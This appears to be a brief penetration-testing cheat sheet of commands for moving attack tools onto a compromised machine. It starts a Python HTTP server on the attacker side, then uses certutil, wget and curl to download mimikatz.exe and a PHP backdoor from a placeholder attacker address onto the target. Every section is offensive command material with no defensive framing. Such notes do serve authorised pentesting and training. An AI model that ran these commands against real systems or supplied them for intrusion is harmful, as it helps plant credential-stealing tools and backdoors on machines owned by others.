## Start Simple HTTP Server on Port 80 (Python 3)
```text
python3 -m http.server 80
python3 -m http.server 8000
```
---
## Start Simple HTTP Server on Port 80 (Python 2)
```text
python -m SimpleHTTPServer 80
```

## Download File from Attacker HTTP Server to Target System (certutil)
```text
certutil -urlcache -f http://<A_IP>/mimikatz.exe mimikatz.exe
```
---
## Download File from Attacker HTTP Server to Target System (wget)
```text
wget http://<A_IP>/php-backdoor.php
```
---
## For Custom Port
```text
wget http://<A_IP>:8000/file
curl -O http://<A_IP>/php-backdoor.php
```
